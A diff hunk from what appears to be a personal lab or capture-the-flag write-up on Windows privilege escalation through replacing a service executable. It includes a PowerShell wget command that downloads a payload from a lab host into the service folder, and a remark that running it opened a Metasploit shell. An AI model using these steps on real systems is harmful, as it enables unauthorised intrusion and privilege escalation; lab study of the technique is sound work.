@@ -142,3 +142,11 @@ python -m http.server 9090
 ```
 ## Download payload on target in the Service Folder
 1. Go to the folder of where the original Message.exe service is running and replace it
+![[Pasted image 20251018220539.png]]
+2. Download the created payload 
+```
+powershell -c wget "http://10.9.0.124:9090/Message.exe" -outfile "Message.exe"
+```
+
+![[Pasted image 20251018221427.png]]
+basically i created a new metasploit listener, on a different port, I downloaded the file on the machine, then executed it and gained a new shell on the new metasploit listener 
